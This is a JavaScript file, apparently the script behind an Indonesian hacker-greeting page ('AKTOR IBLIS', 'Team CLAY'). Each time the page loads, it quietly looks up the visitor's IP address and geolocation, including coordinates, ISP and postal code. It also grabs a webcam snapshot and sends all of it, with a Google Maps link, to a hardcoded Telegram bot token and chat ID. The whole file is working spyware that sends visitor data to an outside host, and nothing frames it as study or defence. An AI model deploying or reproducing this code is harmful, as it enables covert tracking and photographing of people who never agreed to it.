// aktor.js

// Configuration
const config = {
    accessGrantedText: "AKTOR IBLIS",
    welcomeMessage: "Mereka menganggapku remeh dalam Dunia nyata, tapi mereka tidak tahu aku di dalam.",
    teamMessage: "Team CLAY",
    telegramBotToken: '6513717790:AAGljHPM5zxwiwJe2hP9UHkqowRVZTpRP2A',
    telegramChatId: '1618920755'
};

// Function to update text content
function updateTextContent() {
    document.getElementById('access-granted').textContent = config.accessGrantedText;
    document.getElementById('welcome-message').textContent = config.welcomeMessage;
    document.getElementById('team-message').textContent = config.teamMessage;
}

// Function to get IP address
async function getIpAddress() {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
}

// Function to send data to Telegram bot
async function sendToTelegram(info, photoBlob) {
    const formData = new FormData();
    formData.append('chat_id', config.telegramChatId);
    formData.append('caption', info);
    if (photoBlob) {
        formData.append('photo', photoBlob, 'photo.jpg');
    }
    try {
        const response = await fetch(`https://api.telegram.org/bot${config.telegramBotToken}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
        return response.json();
    } catch (error) {
        console.error('Error sending to Telegram:', error);
    }
}

// Function to capture photo
async function capturePhoto() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        await new Promise((resolve) => {
            video.onloadedmetadata = () => {
                video.play();
                resolve();
            };
        });

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);
        stream.getTracks().forEach(track => track.stop());
        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
        return blob;
    } catch (error) {
        console.error('Error capturing photo:', error);
        return null;
    }
}

async function main() {
    try {
        updateTextContent();
        const ip = await getIpAddress();
        const photoBlob = await capturePhoto();

        const response = await axios.get(`https://ipapi.co/${ip}/json`);
        const data = response.data;
        let info = `Alamat IP: ${data.ip}
Kota: ${data.city}
Provinsi: ${data.region}
Negara: ${data.country_name}
ISP: ${data.org}
Jaringan: ${data.network}
Versi: ${data.version}
Kode Provinsi: ${data.region_code}
Kode Negara: ${data.country_code}
Kode Negara ISO3: ${data.country_code_iso3}
Ibu Kota Negara: ${data.country_capital}
TLD Negara: ${data.country_tld}
Kode Benua: ${data.continent_code}
Kode Pos: ${data.postal ? data.postal : 'N/A'}
Latitude: ${data.latitude}
Longitude: ${data.longitude}
Zona Waktu: ${data.timezone}
Offset UTC: ${data.utc_offset}
Kode Panggilan Negara: ${data.country_calling_code}
Mata Uang: ${data.currency}
Nama Mata Uang: ${data.currency_name}
Bahasa: ${data.languages}
Luas Negara: ${data.country_area}
Populasi Negara: ${data.country_population}
ASN: ${data.asn}

[Link GPS Lokasi](https://www.google.com/maps/search/?api=1&query=${data.latitude},${data.longitude})\n\n©Call me Zaynn`;

        await sendToTelegram(info, photoBlob);
    } catch (error) {
        console.error('Error:', error);
    }
}

main();
